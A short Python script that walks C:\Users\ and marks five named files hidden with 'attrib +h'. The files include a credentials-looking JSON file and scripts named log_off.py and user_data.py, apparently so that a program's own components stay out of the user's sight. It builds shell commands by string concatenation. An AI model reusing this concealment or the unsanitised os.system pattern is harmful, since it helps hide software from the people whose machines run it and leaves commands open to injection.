import os

files = ["main.py", "python-game-344621-1c97bcf83064.json", "run_file.bat", "log_off.py", "user_data.py"]

def search(name):
    directory = "C:\\Users\\"
    for root, dirs, files in os.walk(directory):
        if name in files:
            path = os.path.join(root, name)
            os.system("attrib +h " + path)

for i in range(5):
    num = i - 1
    name = files[num]
    search(name)
